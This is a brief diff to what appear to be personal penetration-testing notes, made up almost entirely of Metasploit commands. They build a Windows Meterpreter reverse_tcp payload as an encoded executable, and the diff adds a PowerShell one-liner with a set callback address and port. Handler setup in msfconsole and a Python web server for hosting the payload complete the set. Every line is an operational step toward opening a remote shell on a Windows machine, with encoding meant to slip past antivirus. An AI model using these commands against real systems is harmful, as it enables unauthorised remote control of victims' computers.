@@ -1,4 +1,6 @@
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_kali_ip> LPORT=<your_port> -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
+or
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd
 
 
 msfconsole
@@ -7,3 +9,5 @@ set payload windows/meterpreter/reverse_tcp
 set LHOST <your_kali_ip>
 set LPORT <your_port>
 run
+
+python3 -m http.server 80
